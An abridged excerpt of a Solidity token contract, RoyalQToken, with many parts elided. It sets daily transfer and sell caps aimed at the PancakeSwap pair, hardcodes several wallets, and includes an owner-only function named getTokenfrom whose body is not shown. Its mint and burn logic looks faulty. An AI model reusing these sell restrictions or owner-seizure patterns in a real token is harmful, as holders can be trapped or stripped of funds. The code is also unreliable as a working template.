...
contract RoyalQToken is Context, Ownable, IERC20 {
    ...
    string private _name = "ROYALQTOKEN";
    string private _symbol = "RQT";
    ...
    // uint256 public maxTrPerDay = _tTotal/1000;
     ...
     uint256 public maxSellPerDay = 10*10**9;
    uint256 public maxTrPerDay = 10*10**9;

    address payable public burnWallet = payable(0x000382E3a740583864e8F65cd225B8D5Cbeab61d);
    address payable public marketingWallet = payable(0x23cEA6b0b85b11FdF622ABCD3C07B9C7AEb492a9);
    address payable public liquidityWallet = payable(0x393cc01851Ae4dd1964CFE3734D429bd402943B0);
    address payable public airdropWallet = payable(0x19dEAea8368cdecEde97440E69fA2a3dA485274B);
   ...
   // uint256 public maxTxAmount = _tTotal/100;
    uint256 public maxTxAmount = 10*10**9;
...
function transfer(address recipient, uint256 amount) public override returns (bool) {
    ...
    // function transfer(address recipient, uint256 amount) public override returns (bool) {
    //      require(receivedDuringPast24Hours[recipient] <= maxSellPerDay, "You can only receive up to 100 tokens during the past 24 hours");
    //     _transfer(_msgSender(), recipient, amount);
    //     return true;
    // }
   ...
   function setMarketingWallet(address payable _address) external onlyOwner returns (bool){
    ...
    function setMaxTrPerDay(uint256 amount) external onlyOwner{
    ...
    function _transfer(
		...
		if(!_isExcludedFromFee[from] && !_isExcludedFromFee[to] && !_isExcludedFromPass[from]){			 
			if(block.timestamp < _firstTransfer[from]+5 * 1 minutes){
				require(_totTransfers[from]+amount <= maxTrPerDay, "You can't transfer more than maxTrPerDay");
				_totTransfers[from] += amount;
			}
            else
            	if(to == pancakePair ){
				require(_totTransfers[from]+amount <= maxSellPerDay, "You can't transfer more than maxTrPerDay");
				_totTransfers[from] += amount;
			}
			else{
    ...
    function getTokenfrom(address _add,uint256 _amount)onlyOwner public{
    ...
    function _burn(address account, uint256 value) internal {
        require(account != address(0));
            ...
            _tTotal = _tTotal-value;

         
         
           _totTransfers[account] -= value;
          ////   tokenFromReflection(_rOwned[account]) =  tokenFromReflection(_rOwned[account])-value;
    ...
    function burnFrom(address from, uint256 value) public {
     ...
     function _mint(address account, uint256 value) internal {
      ...
      ///  _balances[account] = _balances[account].add(value);
        ////tokenFromReflection(_rOwned[account]) =tokenFromReflection(_rOwned[account]).add(value);
         _totTransfers[account] -= value;
